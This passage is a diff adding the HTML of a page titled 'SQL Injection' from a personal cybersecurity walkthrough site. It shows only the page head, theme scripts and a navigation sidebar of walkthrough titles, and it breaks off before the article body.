@@ -1,0 +1,3387 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="A collection of notes and writeups from my journey through cyber security concepts.">
+      
+      
+        <meta name="author" content="Nouman Noor">
+      
+      
+        <link rel="canonical" href="https://nanoor.github.io/CyberSec/walkthroughs/thm/sqlinjection/">
+      
+      
+        <link rel="prev" href="../picklerick/">
+      
+      
+        <link rel="next" href="../sqlinjectionlab/">
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.46">
+    
+    
+      
+        <title>SQL Injection - CyberSec</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.6f8fc17f.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#resources" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../.." title="CyberSec" class="md-header__button md-logo" aria-label="CyberSec" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21.038 4.9 13.461.402a2.86 2.86 0 0 0-2.923.001L2.961 4.9A3.02 3.02 0 0 0 1.5 7.503v8.995c0 1.073.557 2.066 1.462 2.603l7.577 4.497a2.86 2.86 0 0 0 2.922 0l7.577-4.497a3.02 3.02 0 0 0 1.462-2.603V7.503A3.02 3.02 0 0 0 21.038 4.9M15.17 18.946l.013.646c.001.078-.05.167-.111.198l-.383.22c-.061.031-.111-.007-.112-.085l-.007-.635c-.328.136-.66.169-.872.084-.04-.016-.057-.075-.041-.142l.139-.584a.24.24 0 0 1 .069-.121.2.2 0 0 1 .036-.026q.033-.017.062-.006c.229.077.521.041.802-.101.357-.181.596-.545.592-.907-.003-.328-.181-.465-.613-.468-.55.001-1.064-.107-1.072-.917-.007-.667.34-1.361.889-1.8l-.007-.652c-.001-.08.048-.168.111-.2l.37-.236c.061-.031.111.007.112.087l.006.653c.273-.109.511-.138.726-.088.047.012.067.076.048.151l-.144.578a.26.26 0 0 1-.065.116.2.2 0 0 1-.038.028.1.1 0 0 1-.057.009c-.098-.022-.332-.073-.699.113-.385.195-.52.53-.517.778.003.297.155.387.681.396.7.012 1.003.318 1.01 1.023.007.689-.362 1.433-.928 1.888m3.973-1.087c0 .06-.008.116-.058.145l-1.916 1.164c-.05.029-.09.004-.09-.056v-.494c0-.06.037-.093.087-.122l1.887-1.129c.05-.029.09-.004.09.056zm1.316-11.062-7.168 4.427c-.894.523-1.553 1.109-1.553 2.187v8.833c0 .645.26 1.063.66 1.184a2.3 2.3 0 0 1-.398.039c-.42 0-.833-.114-1.197-.33L3.226 18.64a2.5 2.5 0 0 1-1.201-2.142V7.503c0-.881.46-1.702 1.201-2.142L10.803.863a2.34 2.34 0 0 1 2.394 0l7.577 4.498a2.48 2.48 0 0 1 1.164 1.732c-.252-.536-.818-.682-1.479-.296"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            CyberSec
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              SQL Injection
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h4v-1.9H7c-1.71 0-3.1-1.39-3.1-3.1M8 13h8v-2H8zm9-6h-4v1.9h4c1.71 0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4a5 5 0 0 0 5-5 5 5 0 0 0-5-5"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="black" data-md-color-accent="black"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="black"  aria-label="Switch to system preference"  type="radio" name="__palette" id="__palette_2">
+    
+      <label class="md-header__button md-icon" title="Switch to system preference" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../.." class="md-tabs__link">
+        
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+    
+      
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../notes/misc/shellstabilisation/" class="md-tabs__link">
+          
+  
+    
+  
+  Notes
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+    
+  
+  
+    
+    
+      
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../activedirectorybasics/" class="md-tabs__link">
+          
+  
+    
+  
+  Walkthroughs
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="CyberSec" class="md-nav__button md-logo" aria-label="CyberSec" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21.038 4.9 13.461.402a2.86 2.86 0 0 0-2.923.001L2.961 4.9A3.02 3.02 0 0 0 1.5 7.503v8.995c0 1.073.557 2.066 1.462 2.603l7.577 4.497a2.86 2.86 0 0 0 2.922 0l7.577-4.497a3.02 3.02 0 0 0 1.462-2.603V7.503A3.02 3.02 0 0 0 21.038 4.9M15.17 18.946l.013.646c.001.078-.05.167-.111.198l-.383.22c-.061.031-.111-.007-.112-.085l-.007-.635c-.328.136-.66.169-.872.084-.04-.016-.057-.075-.041-.142l.139-.584a.24.24 0 0 1 .069-.121.2.2 0 0 1 .036-.026q.033-.017.062-.006c.229.077.521.041.802-.101.357-.181.596-.545.592-.907-.003-.328-.181-.465-.613-.468-.55.001-1.064-.107-1.072-.917-.007-.667.34-1.361.889-1.8l-.007-.652c-.001-.08.048-.168.111-.2l.37-.236c.061-.031.111.007.112.087l.006.653c.273-.109.511-.138.726-.088.047.012.067.076.048.151l-.144.578a.26.26 0 0 1-.065.116.2.2 0 0 1-.038.028.1.1 0 0 1-.057.009c-.098-.022-.332-.073-.699.113-.385.195-.52.53-.517.778.003.297.155.387.681.396.7.012 1.003.318 1.01 1.023.007.689-.362 1.433-.928 1.888m3.973-1.087c0 .06-.008.116-.058.145l-1.916 1.164c-.05.029-.09.004-.09-.056v-.494c0-.06.037-.093.087-.122l1.887-1.129c.05-.029.09-.004.09.056zm1.316-11.062-7.168 4.427c-.894.523-1.553 1.109-1.553 2.187v8.833c0 .645.26 1.063.66 1.184a2.3 2.3 0 0 1-.398.039c-.42 0-.833-.114-1.197-.33L3.226 18.64a2.5 2.5 0 0 1-1.201-2.142V7.503c0-.881.46-1.702 1.201-2.142L10.803.863a2.34 2.34 0 0 1 2.394 0l7.577 4.498a2.48 2.48 0 0 1 1.164 1.732c-.252-.536-.818-.682-1.479-.296"/></svg>
+
+    </a>
+    CyberSec
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Home
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Notes
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            Notes
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_1" id="__nav_2_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Misc
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            Misc
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../notes/misc/shellstabilisation/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Shell Stabilisation
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Network
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            Network
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../notes/network/dns/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    DNS
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../notes/network/osimodel/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    OSI Model
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Privilege Escalation (Linux)
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            Privilege Escalation (Linux)
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../notes/privesc_linux/crontab/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Cron Jobs
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../notes/privesc_linux/passwdshadow/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Passwd/Shadow File
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../notes/privesc_linux/pathvariable/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Path Variable
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../notes/privesc_linux/suid/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SUID
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    Walkthroughs
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            Walkthroughs
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    THM
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            THM
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../activedirectorybasics/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Active Directory Basics
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_1_2" id="__nav_3_1_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Advent of Cyber 2022
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_1_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1_2">
+            <span class="md-nav__icon md-icon"></span>
+            Advent of Cyber 2022
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day1/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 1 - Frameworks
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day2/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 2 - Log Analysis
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day3/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 3 - OSINT
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day4/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 4 - Scanning
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day5/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 5 - Brute Force
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day6/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 6 - Email Analysis
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day7/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 7 - Cyber Chef
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day8/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 8 - Smart Contracts
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day9/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 9 - Pivoting
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day10/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 10 - Hack a Game
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day11/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 11 - Memory Forensics
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day12/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 12 - Malware Analysis
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day13/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 13 - Packet Analysis
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day14/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 14 - Web Applications
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day15/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 15 - Secure Coding (Securing File Upload)
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day16/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 16 - Secure Coding (SQLi)
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day17/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 17 - Secure Coding (Regular Expressions)
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day18/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 18 - Sigma
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day19/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 19 - Hardware Hacking
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day20/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 20 - Firmware Reverse Engineering
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day21/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 21 - MQTT
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../authenticationbypass/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Authentication Bypass
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../basicpentesting/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Basic Pentesting
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
